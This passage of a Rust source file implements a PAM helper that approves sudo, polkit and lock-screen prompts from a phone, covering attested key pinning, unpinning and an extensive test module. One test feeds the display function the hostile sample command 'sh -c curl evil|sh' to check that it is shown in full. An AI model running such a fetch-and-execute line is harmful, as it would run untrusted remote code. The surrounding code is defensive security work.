            Some(level.word().to_string()),
            d.user_auth_type == Some(2),
        ),
        Err(why) if attested => {
            return Err(format!(
                "the phone's key attestation does not check ({why:?}); nothing was pinned"
            ));
        }
        Err(why) => {
            let (_, leaf) = chain
                .first()
                .and_then(|der| x509_parser::parse_x509_certificate(der).ok())
                .ok_or("the answer carries no key")?;
            eprintln!(
                "WARNING: pinning WITHOUT attestation ({why:?}). Nothing proves this key is in the phone's hardware, needs its fingerprint, or is not a copy another program made. Check the fingerprint below on the phone, digit by digit."
            );
            (leaf.tbs_certificate.subject_pki.raw.to_vec(), None, false)
        }
    };
    let b64 = base64::engine::general_purpose::STANDARD.encode(&spki);
    if crate::phone_approves::p256_point(&b64).is_none() {
        return Err("the key is not EC P-256".to_string());
    }
    Ok(PhoneKey {
        device_id: got.device_id.clone(),
        fingerprint: crate::phone_approves::spki_fingerprint(&spki),
        public_key: b64,
        biometric_only,
        added_unix: now_unix,
        attested: level,
    })
}

/// `--pin USER` as root: ask the phone for an attested key and pin it.
fn pin_mode(user: &str, attested: bool) -> i32 {
    if !is_plain_name(user) {
        eprintln!("Usage: sudo {HELPER_PATH} --pin USER");
        return 2;
    }
    // SAFETY: geteuid has no preconditions.
    if unsafe { libc::geteuid() } != 0 {
        eprintln!("Pinning needs root: sudo {HELPER_PATH} --pin {user}");
        return 2;
    }
    let Some(account) = lookup_user(user) else {
        eprintln!("No user {user}.");
        return 2;
    };
    let nonce = match new_nonce() {
        Ok(n) => n,
        Err(e) => {
            eprintln!("{}", e.said());
            return 1;
        }
    };
    let now = now_unix();
    let expected = Approval {
        id: uuid::Uuid::new_v4().to_string(),
        kind: Kind::Pin,
        service: PIN_SERVICE.to_string(),
        user: user.to_string(),
        requester: user.to_string(),
        action: String::new(),
        command: String::new(),
        tty: String::new(),
        origin: String::new(),
        computer: String::new(),
        nonce,
        issued_unix: now,
        expires_unix: now + PIN_TIMEOUT_SECS,
    };
    // The user's files are touched only by a child that has become the
    // user, which hands back the answer through a pipe.
    let mut fds = [0i32; 2];
    // SAFETY: a plain pipe into a local array.
    if unsafe { libc::pipe2(fds.as_mut_ptr(), libc::O_CLOEXEC) } != 0 {
        eprintln!("No pipe.");
        return 1;
    }
    // SAFETY: this process runs one thread here; the child only calls
    // what pin_child calls, then _exit.
    let pid = unsafe { libc::fork() };
    if pid < 0 {
        eprintln!("No fork.");
        return 1;
    }
    if pid == 0 {
        // SAFETY: the read end is the parent's.
        unsafe { libc::close(fds[0]) };
        let out = match pin_child(&account, expected.clone()) {
            Ok(answer) => serde_json::to_vec(&answer).unwrap_or_default(),
            Err(why) => {
                eprintln!("{why}");
                Vec::new()
            }
        };
        // SAFETY: writes from a live buffer to the pipe, then leaves.
        unsafe {
            let mut sent = 0;
            while sent < out.len() {
                let n = libc::write(fds[1], out[sent..].as_ptr().cast(), out.len() - sent);
                if n <= 0 {
                    break;
                }
                sent += n as usize;
            }
            libc::_exit(0);
        }
    }
    // SAFETY: the write end is the child's.
    unsafe { libc::close(fds[1]) };
    let mut raw = Vec::new();
    {
        use std::os::fd::FromRawFd as _;
        // SAFETY: fds[0] is this process's own, owned by the File from here.
        let pipe = unsafe { std::fs::File::from_raw_fd(fds[0]) };
        let _ = pipe.take(512 * 1024).read_to_end(&mut raw);
    }
    let mut status = 0;
    // SAFETY: waits for this process's own child.
    unsafe { libc::waitpid(pid, &mut status, 0) };
    let Ok(got) = serde_json::from_slice::<PinAnswer>(&raw) else {
        eprintln!("Nothing was pinned.");
        return 1;
    };
    let key = match check_pin_answer(&expected, &got, attested, now_unix()) {
        Ok(key) => key,
        Err(why) => {
            eprintln!("{why}");
            return 1;
        }
    };
    let mut pin = read_pin(user).unwrap_or(Pin {
        user: user.to_string(),
        computer: got.approval.computer.clone(),
        keys: Vec::new(),
        pinned_unix: 0,
    });
    if pin.computer != got.approval.computer {
        // Another certificate: the computer was set up again, so the keys
        // pinned for the old one go.
        pin.keys.clear();
        pin.computer = got.approval.computer.clone();
    }
    let replaced = pin
        .keys
        .iter()
        .any(|k| k.device_id == key.device_id && k.public_key != key.public_key);
    pin.keys.retain(|k| k.device_id != key.device_id);
    pin.keys.push(key.clone());
    pin.pinned_unix = now_unix();
    if let Err(e) = write_pin(&pin) {
        eprintln!("The pin could not be written: {e}");
        return 1;
    }
    println!("Pinned for {user} in {}:", pin_path(user).display());
    println!("  phone {}", key.device_id);
    println!("  key   {}", key.fingerprint);
    println!(
        "  {}",
        match &key.attested {
            Some(level) => format!(
                "attested by Google's roots: in the phone's {}, made there, signs only after {} for each use",
                if level == "strongbox" {
                    "StrongBox"
                } else {
                    "TEE"
                },
                if key.biometric_only {
                    "the fingerprint"
                } else {
                    "the fingerprint or screen lock"
                }
            ),
            None => "NOT attested".to_string(),
        }
    );
    if replaced {
        println!("  (it replaces the key pinned before for this phone)");
    }
    println!(
        "{} phone(s) pinned in all. Check every digit of the key against the phone's Settings.",
        pin.keys.len()
    );
    0
}

fn write_pin(pin: &Pin) -> std::io::Result<()> {
    use std::os::unix::fs::{DirBuilderExt as _, PermissionsExt as _};
    for dir in ["/etc/pocketdesk", PIN_DIR] {
        match std::fs::DirBuilder::new().mode(0o755).create(dir) {
            Ok(()) => {}
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => {}
            Err(e) => return Err(e),
        }
        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o755))?;
    }
    let path = pin_path(&pin.user);
    let tmp = path.with_extension("json.tmp");
    let _ = std::fs::remove_file(&tmp);
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o644)
        .open(&tmp)?;
    file.write_all(serde_json::to_string_pretty(pin)?.as_bytes())?;
    file.sync_all()?;
    std::fs::rename(&tmp, &path)
}

fn unpin_mode(user: &str) -> i32 {
    if !is_plain_name(user) {
        eprintln!("Usage: sudo {HELPER_PATH} --unpin USER");
        return 2;
    }
    match std::fs::remove_file(pin_path(user)) {
        Ok(()) => {
            println!("No phone approves for {user} now.");
            0
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            println!("Nothing was pinned for {user}.");
            0
        }
        Err(e) => {
            eprintln!("{e} (run it with sudo)");
            1
        }
    }
}

fn usage() {
    eprintln!(
        "pocketdesk-pam-ask: approve sudo, polkit and the lock screen on your phone.\n\
         Run by PAM (pam_exec); never edits /etc/pam.d.\n\
         \n  --lines                          the PAM lines to add yourself\n\
         \x20 --test                           a dry ask, as you\n\
         \x20 --pin USER                       as root: pin USER's phone's attested key\n\
         \x20 --pin-without-attestation USER   the same for a phone without attestation\n\
         \x20 --unpin USER                     as root: forget them"
    );
}

/// The exit status for `args` with the environment `vars`. Under PAM
/// (`PAM_TYPE` in `vars`) 0 only from [`pam_mode`]'s verified Yes.
pub fn run(args: &[String], vars: &[(String, String)]) -> i32 {
    let under_pam = vars.iter().any(|(k, _)| k == "PAM_TYPE");
    match mode_of(args, under_pam) {
        Mode::Pam(forced) => {
            let result = pam_env(vars).and_then(|env| pam_mode(forced, &env));
            match result {
                Ok(_) => 0,
                Err(e) => {
                    // pam_exec's `stdout` shows it; the journal keeps
                    // pam_exec's own failure line.
                    eprintln!("pocketdesk-pam-ask: {}", e.said());
                    if matches!(e, GiveUp::NoAnswer | GiveUp::Refused(_)) {
                        say("Not approved on the phone.");
                    }
                    1
                }
            }
        }
        Mode::BadLine(why) => {
            eprintln!("pocketdesk-pam-ask: {}", GiveUp::BadLine(why).said());
            1
        }
        Mode::Lines => {
            for (service, kind) in PAM_SERVICES {
                println!(
                    "# /etc/pam.d/{service} ({}): after pam_faillock.so preauth, before pam_unix",
                    kind.word()
                );
                println!("{}", pam_line());
            }
            0
        }
        Mode::Test => test_mode(),
        Mode::Pin { user, attested } => pin_mode(&user, attested),
        Mode::Unpin(user) => unpin_mode(&user),
        Mode::Help => {
            usage();
            0
        }
        Mode::Usage => {
            usage();
            2
        }
    }
}

/// The helper's `main`: its exit status.
pub fn main() -> i32 {
    let args: Vec<String> = std::env::args().skip(1).collect();
    let vars: Vec<(String, String)> = std::env::vars_os()
        .map(|(k, v)| {
            (
                k.to_string_lossy().into_owned(),
                v.to_string_lossy().into_owned(),
            )
        })
        .collect();
    run(&args, &vars)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::phone_approves::tests::{TestPhone, approval};

    fn pin(phones: &[&TestPhone]) -> Pin {
        Pin {
            user: "alice".to_string(),
            computer: "ab".repeat(32),
            keys: phones.iter().map(|p| p.key()).collect(),
            pinned_unix: 1,
        }
    }

    fn on() -> Config {
        Config {
            phone_approves: true,
            ..Config::default()
        }
    }

    fn sudo(remote: bool) -> Ask<'static> {
        Ask {
            kind: Kind::Admin,
            service: "sudo",
            user: "alice",
            requester: Some("alice"),
            remote,
        }
    }

    fn dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("pd-pam-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn fresh(id: &str) -> Approval {
        let now = now_unix();
        Approval {
            id: id.to_string(),
            issued_unix: now,
            expires_unix: now + 20,
            ..approval("01")
        }
    }

    fn vars(list: &[(&str, &str)]) -> Vec<(String, String)> {
        list.iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|a| a.to_string()).collect()
    }

    /// Review N4: under PAM nothing but a verified Yes exits 0: no other
    /// mode is reachable, and a garbled line only fails.
    #[test]
    fn under_pam_only_a_verified_yes_exits_zero() {
        for line in [
            vec!["--lines"],
            vec!["--help"],
            vec!["-h"],
            vec!["--test"],
            vec!["--pin", "alice"],
            vec!["--pin-without-attestation", "alice"],
            vec!["--unpin", "alice"],
            vec!["--kind"],
            vec!["--kind", "root"],
            vec!["--kind", "admin", "--lines"],
            vec!["quiet"],
            vec!["stdout", "/usr/lib/pocketdesk/pocketdesk-pam-ask"],
        ] {
            assert!(
                matches!(mode_of(&args(&line), true), Mode::BadLine(_)),
                "{line:?}"
            );
            for pam_type in ["auth", "account", "session", "password", ""] {
                let env = vars(&[
                    ("PAM_TYPE", pam_type),
                    ("PAM_USER", "nobody-test"),
                    ("PAM_SERVICE", "sudo"),
                ]);
                assert_eq!(run(&args(&line), &env), 1, "{line:?} {pam_type}");
            }
        }
        assert_eq!(mode_of(&[], true), Mode::Pam(None));
        assert_eq!(
            mode_of(&args(&["--kind", "unlock"]), true),
            Mode::Pam(Some(Kind::Unlock))
        );
        // The right line, but not authentication, or no user, or nothing
        // pinned: every one fails.
        for env in [
            vars(&[
                ("PAM_TYPE", "account"),
                ("PAM_USER", "nobody-test"),
                ("PAM_SERVICE", "sudo"),
            ]),
            vars(&[
                ("PAM_TYPE", "open_session"),
                ("PAM_USER", "nobody-test"),
                ("PAM_SERVICE", "sudo"),
            ]),
            vars(&[("PAM_TYPE", "auth"), ("PAM_SERVICE", "sudo")]),
            vars(&[
                ("PAM_TYPE", "auth"),
                ("PAM_USER", "nobody-test"),
                ("PAM_SERVICE", "login"),
            ]),
            vars(&[
                ("PAM_TYPE", "auth"),
                ("PAM_USER", "nobody-test"),
                ("PAM_SERVICE", PIN_SERVICE),
            ]),
            vars(&[
                ("PAM_TYPE", "auth"),
                ("PAM_USER", "nobody-test"),
                ("PAM_SERVICE", "sudo"),
            ]),
        ] {
            assert_eq!(run(&[], &env), 1, "{env:?}");
        }
        assert_eq!(
            pam_mode(
                None,
                &PamEnv {
                    pam_type: Some("account".into()),
                    ..Default::default()
                }
            ),
            Err(GiveUp::NotPam)
        );
        // Without PAM, the helper's own commands.
        assert_eq!(mode_of(&args(&["--lines"]), false), Mode::Lines);
        assert_eq!(mode_of(&[], false), Mode::Usage);
    }

    /// Review N5: a `PAM_*` item given twice is refused.
    #[test]
    fn a_pam_item_given_twice_is_refused() {
        let twice = vars(&[
            ("PAM_USER", "bob"),
            ("PAM_TYPE", "auth"),
            ("PAM_SERVICE", "sudo"),
            ("PAM_USER", "alice"),
        ]);
        assert!(matches!(pam_env(&twice), Err(GiveUp::Broken(_))));
        assert_eq!(run(&[], &twice), 1);
        let once = pam_env(&vars(&[
            ("PAM_USER", "alice"),
            ("HOME", "/x"),
            ("PAM_RUSER", "alice"),
        ]))
        .unwrap();
        assert_eq!(once.user.as_deref(), Some("alice"));
        assert_eq!(once.ruser.as_deref(), Some("alice"));
    }

    #[test]
    fn it_is_off_by_default_and_gives_up_at_once_without_a_phone() {
        let phone = TestPhone::new("phone-a");
        let pinned = pin(&[&phone]);
        assert_eq!(
            precheck(sudo(false), &Config::default(), true, &pinned),
            Err(GiveUp::Off)
        );
        assert_eq!(
            precheck(sudo(false), &on(), false, &pinned),
            Err(GiveUp::ServerDown)
        );
        assert!(matches!(
            precheck(sudo(false), &on(), true, &pin(&[])),
            Err(GiveUp::NotPinned(_))
        ));
        let mut only_b = on();
        only_b.phone_approves_phones = vec!["phone-b".to_string()];
        assert!(matches!(
            precheck(sudo(false), &only_b, true, &pinned),
            Err(GiveUp::NotPinned(_))
        ));
        assert_eq!(
            precheck(sudo(false), &on(), true, &pinned),
            Ok(vec![phone.key()])
        );
    }

    /// Review I3: polkit has its own switch, off, and another user's
    /// request is refused.
    #[test]
    fn polkit_has_its_own_switch_and_another_users_request_is_refused() {
        let phone = TestPhone::new("phone-a");
        let pinned = pin(&[&phone]);
        let polkit = Ask {
            service: "polkit-1",
            ..sudo(false)
        };
        assert_eq!(
            precheck(polkit, &on(), true, &pinned),
            Err(GiveUp::PolkitOff)
        );
        let mut with_polkit = on();
        with_polkit.phone_approves_polkit = true;
        assert!(precheck(polkit, &with_polkit, true, &pinned).is_ok());
        let by_bob = Ask {
            requester: Some("bob"),
            ..polkit
        };
        assert_eq!(
            precheck(by_bob, &with_polkit, true, &pinned),
            Err(GiveUp::OtherUser)
        );
        assert_eq!(
            precheck(
                Ask {
                    requester: Some("bob"),
                    ..sudo(false)
                },
                &on(),
                true,
                &pinned
            ),
            Err(GiveUp::OtherUser)
        );
        assert!(
            precheck(
                Ask {
                    requester: None,
                    ..sudo(false)
                },
                &on(),
                true,
                &pinned
            )
            .is_ok()
        );
    }

    /// Review N3: three a minute; three in five minutes at the lock screen.
    #[test]
    fn requests_are_rate_limited() {
        assert!(rate_allows(&[], 1_000, Kind::Admin));
        assert!(rate_allows(&[990, 995], 1_000, Kind::Admin));
        assert!(!rate_allows(&[990, 995, 999], 1_000, Kind::Admin));
        assert!(
            rate_allows(&[930, 935, 939], 1_000, Kind::Admin),
            "a minute on"
        );
        assert!(!rate_allows(&[800, 850, 900], 1_000, Kind::Unlock));
        assert!(rate_allows(&[690, 850, 900], 1_000, Kind::Unlock));
    }

    /// Review I2: what is shown is the executable and every argument, every
    /// hidden character visible, never cut.
    #[test]
    fn the_command_shown_is_the_executable_and_nothing_hides() {
        assert_eq!(
            command_text("/usr/bin/sudo", &args(&["pacman", "-Syu"])).as_deref(),
            Some("/usr/bin/sudo pacman -Syu")
        );
        assert_eq!(
            command_text("/usr/bin/sudo", &args(&["sh", "-c", "curl evil|sh"])).as_deref(),
            Some("/usr/bin/sudo sh -c 'curl evil|sh'")
        );
        assert_eq!(
            command_text("/usr/bin/sudo", &args(&["rm", "a\u{202E}b"])).as_deref(),
            Some("/usr/bin/sudo rm 'a⟨U+202E⟩b'")
        );
        // Padding with blanks no longer fits: it is not asked at all.
        let padded = format!("ls{}", "\u{2800}".repeat(600));
        assert_eq!(command_text("/usr/bin/sudo", &[padded]), None);
        let chain = [
            Ancestor {
                pid: 812,
                comm: "sudo".into(),
                ..Default::default()
            },
            Ancestor {
                pid: 700,
                comm: "bash".into(),
                ..Default::default()
            },
            Ancestor {
                pid: 650,
                comm: "kit\u{202E}ty".into(),
                ..Default::default()
            },
        ];
        assert_eq!(
            origin_text(&chain),
            "sudo(812) < bash(700) < kit⟨U+202E⟩ty(650)"
        );
    }

    #[test]
    fn no_linked_phone_gives_up_without_waiting() {
        let dir = dir("nophone");
        let phone = TestPhone::new("phone-a");
        let a = fresh("np-1");
        files::set_status(&dir, &a.id, &Status::NoPhone).unwrap();
        let start = Instant::now();
        assert_eq!(
            ask_and_wait(&dir, &a, &[phone.key()], |_| panic!("waited")),
            Err(GiveUp::NoPhone)
        );
        assert!(start.elapsed() < Duration::from_secs(1));
        assert_eq!(files::status(&dir, &a.id), None, "withdrawn");
        let b = fresh("np-2");
        let start = Instant::now();
        assert_eq!(
            ask_and_wait(&dir, &b, &[phone.key()], std::thread::sleep),
            Err(GiveUp::NotTaken)
        );
        assert!(start.elapsed() < TAKE_WAIT + Duration::from_secs(1));
        assert!(files::take_all(&dir, now_unix()).is_empty(), "withdrawn");
        let _ = std::fs::remove_dir_all(&dir);
    }

    fn answered(device: &str, answer: Answer, signature: Option<String>) -> Status {
        Status::Answered {
            device_id: device.to_string(),
            answer,
            signature,
            attestation: None,
        }
    }

    #[test]
    fn a_signed_yes_approves_and_a_replay_or_a_no_does_not() {
        let dir = dir("answer");
        let phone = TestPhone::new("phone-a");
        let a = fresh("an-1");
        files::set_status(
            &dir,
            &a.id,
            &answered("phone-a", Answer::Yes, Some(phone.sign(&a))),
        )
        .unwrap();
        assert_eq!(
            ask_and_wait(&dir, &a, &[phone.key()], |_| {}),
            Ok("phone-a".to_string())
        );
        let b = Approval {
            nonce: "02".repeat(32),
            ..fresh("an-2")
        };
        files::set_status(
            &dir,
            &b.id,
            &answered("phone-a", Answer::Yes, Some(phone.sign(&a))),
        )
        .unwrap();
        assert_eq!(
            ask_and_wait(&dir, &b, &[phone.key()], |_| {}),
            Err(GiveUp::Refused(Refusal::BadSignature))
        );
        let c = fresh("an-3");
        files::set_status(&dir, &c.id, &answered("phone-a", Answer::No, None)).unwrap();
        assert_eq!(
            ask_and_wait(&dir, &c, &[phone.key()], |_| {}),
            Err(GiveUp::Refused(Refusal::Declined))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_expired_request_is_not_approved() {
        let dir = dir("expired");
        let phone = TestPhone::new("phone-a");
        let now = now_unix();
        let a = Approval {
            issued_unix: now - 30,
            expires_unix: now - 10,
            ..fresh("ex-1")
        };
        files::set_status(
            &dir,
            &a.id,
            &answered("phone-a", Answer::Yes, Some(phone.sign(&a))),
        )
        .unwrap();
        assert_eq!(
            ask_and_wait(&dir, &a, &[phone.key()], |_| {}),
            Err(GiveUp::Refused(Refusal::Late))
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn ssh_is_refused_by_default() {
        let desk = [
            Ancestor {
                comm: "bash".to_string(),
                ..Default::default()
            },
            Ancestor {
                comm: "kitty".to_string(),
                ..Default::default()
            },
        ];
        assert!(!is_remote(None, "laptop", &desk));
        assert!(!is_remote(Some(""), "laptop", &desk));
        assert!(
            !is_remote(Some("laptop"), "laptop", &desk),
            "sudo names this host"
        );
        assert!(is_remote(Some("192.0.2.9"), "laptop", &desk));
        for remote in [
            Ancestor {
                comm: "sshd-session".to_string(),
                ..Default::default()
            },
            Ancestor {
                comm: "bash".to_string(),
                ssh_env: true,
                ..Default::default()
            },
            Ancestor {
                comm: "bash".to_string(),
                remote_session: true,
                ..Default::default()
            },
        ] {
            let mut chain = desk.to_vec();
            chain.push(remote);
            assert!(is_remote(None, "laptop", &chain));
        }
        let phone = TestPhone::new("phone-a");
        assert_eq!(
            precheck(sudo(true), &on(), true, &pin(&[&phone])),
            Err(GiveUp::Remote)
        );
        let mut from_afar = on();
        from_afar.phone_approves_local_only = false;
        assert!(precheck(sudo(true), &from_afar, true, &pin(&[&phone])).is_ok());
    }

    #[test]
    fn the_lock_screen_has_its_own_switch_and_unknown_services_are_refused() {
        assert_eq!(kind_of("sudo", None), Some(Kind::Admin));
        assert_eq!(kind_of("polkit-1", None), Some(Kind::Admin));
        assert_eq!(kind_of("hyprlock", None), Some(Kind::Unlock));
        assert_eq!(
            kind_of("gdm-password", None),
            None,
            "the greeter logs in too"
        );
        assert_eq!(kind_of("login", None), None);
        assert_eq!(kind_of("sshd", None), None);
        let phone = TestPhone::new("phone-a");
        let lock = Ask {
            kind: Kind::Unlock,
            service: "hyprlock",
            ..sudo(false)
        };
        assert_eq!(
            precheck(lock, &on(), true, &pin(&[&phone])),
            Err(GiveUp::LockScreenOff)
        );
        let mut with_lock = on();
        with_lock.phone_approves_lock_screen = true;
        assert!(precheck(lock, &with_lock, true, &pin(&[&phone])).is_ok());
    }

    #[test]
    fn only_a_root_only_pin_is_trusted_and_the_timeout_is_bounded() {
        assert!(root_only(0, 0o100644));
        assert!(root_only(0, 0o040755));
        assert!(!root_only(1000, 0o100644), "the user's");
        assert!(!root_only(0, 0o100664), "group-writable");
        assert!(!root_only(0, 0o040777), "anyone's");
        let mut c = Config::default();
        assert_eq!(timeout_secs(&c), 20);
        c.phone_approves_timeout_secs = 0;
        assert_eq!(timeout_secs(&c), MIN_TIMEOUT_SECS);
        c.phone_approves_timeout_secs = 3_600;
        assert_eq!(timeout_secs(&c), MAX_TIMEOUT_SECS);
        assert!(pam_line().contains("sufficient"));
        assert!(!pam_line().contains("required"));
    }

    /// Review N1: a user's file is read only as itself: no link, no pipe,
    /// not someone else's, not too big.
    #[test]
    fn a_users_file_is_read_without_following_links_or_pipes() {
        let dir = dir("userfile");
        // SAFETY: getuid has no preconditions.
        let uid = unsafe { libc::getuid() };
        let file = dir.join("cert.der");
        std::fs::write(&file, b"cert").unwrap();
        assert_eq!(read_users_file(&file, uid, 100).unwrap(), b"cert");
        assert!(read_users_file(&file, uid + 1, 100).is_err(), "not theirs");
        assert!(read_users_file(&file, uid, 2).is_err(), "too big");
        let link = dir.join("link");
        std::os::unix::fs::symlink(&file, &link).unwrap();
        assert!(read_users_file(&link, uid, 100).is_err(), "a link");
        let fifo = dir.join("fifo");
        let c = CString::new(fifo.to_str().unwrap()).unwrap();
        // SAFETY: a path in the test's own folder.
        assert_eq!(unsafe { libc::mkfifo(c.as_ptr(), 0o600) }, 0);
        assert!(
            read_users_file(&fifo, uid, 100).is_err(),
            "a pipe, without blocking"
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Review I1: root pins only an attested key for this very pin; the
    /// sample chain's key needs no authentication, so it is refused, and
    /// without attestation it is pinned only on request.
    #[test]
    fn a_pin_answer_is_checked_by_root() {
        let now = 1_798_761_600; // 2027-01-01, within the sample's dates
        let expected = Approval {
            id: "p-1".to_string(),
            kind: Kind::Pin,
            service: PIN_SERVICE.to_string(),
            user: "alice".to_string(),
            requester: "alice".to_string(),
            action: String::new(),
            command: String::new(),
            tty: String::new(),
            origin: String::new(),
            computer: String::new(),
            nonce: "01".repeat(32),
            issued_unix: now,
            expires_unix: now + PIN_TIMEOUT_SECS,
        };
        let chain: Vec<String> = [
            &include_bytes!("attestation_testdata/tee_cert0.der")[..],
            &include_bytes!("attestation_testdata/tee_cert1.der")[..],
            &include_bytes!("attestation_testdata/tee_cert2.der")[..],
            &include_bytes!("attestation_testdata/tee_cert3.der")[..],
        ]
        .iter()
        .map(|d| base64::engine::general_purpose::STANDARD.encode(d))
        .collect();
        let got = |answer, approval: &Approval| PinAnswer {
            approval: Approval {
                computer: "ab".repeat(32),
                ..approval.clone()
            },
            device_id: "phone-a".to_string(),
            answer,
            attestation: Some(chain.clone()),
        };
        let err = check_pin_answer(&expected, &got(Answer::Yes, &expected), true, now).unwrap_err();
        assert!(err.contains("does not check"), "{err}");
        let key = check_pin_answer(&expected, &got(Answer::Yes, &expected), false, now).unwrap();
        assert_eq!(key.attested, None);
        assert_eq!(key.fingerprint.len(), 79);
        assert!(check_pin_answer(&expected, &got(Answer::No, &expected), false, now).is_err());
        let other = Approval {
            nonce: "02".repeat(32),
            ..expected.clone()
        };
        assert!(
            check_pin_answer(&expected, &got(Answer::Yes, &other), false, now)
                .unwrap_err()
                .contains("not for this pin")
        );
    }
}
